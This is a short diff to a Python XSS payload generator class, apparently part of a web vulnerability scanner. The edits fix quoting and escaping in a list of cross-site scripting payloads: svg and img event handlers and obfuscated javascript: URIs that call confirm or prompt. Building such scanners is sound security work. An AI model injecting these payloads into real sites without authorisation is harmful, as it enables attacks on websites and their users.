@@ -31,7 +31,7 @@ class XssGen():
             '<svg><script>PAYLOAD</script></svg>',
             '<img/src="x"/onerror="PAYLOAD">',
             '<img src=x onerror="PAYLOAD">',
-            '<svg/onload=\'PAYLOAD\'//>',
+            '<svg/onload="PAYLOAD"//>',
             '<svg><animate onbegin="PAYLOAD">',
         ]
 
@@ -55,7 +55,7 @@ class XssGen():
             "/javascript:confirm(UNIQUE)",
             "/javascript:confirm(UNIQUE);",
             "<>javascript:confirm(UNIQUE);",
-            "\j\av\a\s\cr\i\pt\:\p\ro\mpt\(UNIQUE\)",
+            "\\j\\av\\a\\s\\cr\\i\\pt\\:\\p\\ro\\mpt\\(UNIQUE)",
             "javascript:confirm(UNIQUE)",
             "javascript:confirm(UNIQUE);",
             "javascripT://anything%0D%0A%0D%0Awindow.confirm(UNIQUE)",
